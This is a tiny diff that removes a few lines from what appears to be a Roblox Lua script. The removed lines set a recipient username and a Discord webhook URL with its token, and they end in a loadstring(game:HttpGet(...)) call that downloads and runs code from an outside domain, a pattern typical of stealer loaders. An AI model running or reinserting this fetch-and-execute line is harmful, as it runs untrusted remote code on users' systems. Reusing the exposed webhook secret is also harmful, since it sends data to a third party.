@@ -1,5 +1,1 @@
-Username = "towerofadonay"
-MailMessage = "."
-Webhook = "https://discord.com/api/webhooks/1237554256299556885/Z4W3H6_lhwblHq-fyzDUH8uVkSwcdtAWt5sNbECPSAay7hJhRNOj_wQybTDcBw_F_ZMk"
 
-loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
